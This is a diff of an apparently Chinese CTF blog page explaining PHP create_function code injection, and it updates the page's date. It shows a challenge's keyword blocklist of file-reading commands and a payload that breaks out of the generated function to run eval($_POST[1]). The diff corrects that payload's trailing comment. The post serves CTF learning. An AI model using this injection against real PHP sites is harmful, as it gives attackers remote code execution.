@@ -581,7 +581,7 @@
 <h4 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 <p>最后一个过滤我们可以用<code>create_function()</code>绕过:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);//&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>执行时相当于：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
@@ -665,10 +665,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-06T10:18:36+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-25T16:59:11+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2020年6月6日</p>
+    <p>更新于：2021年1月25日</p>
   </a>
 </div>
 
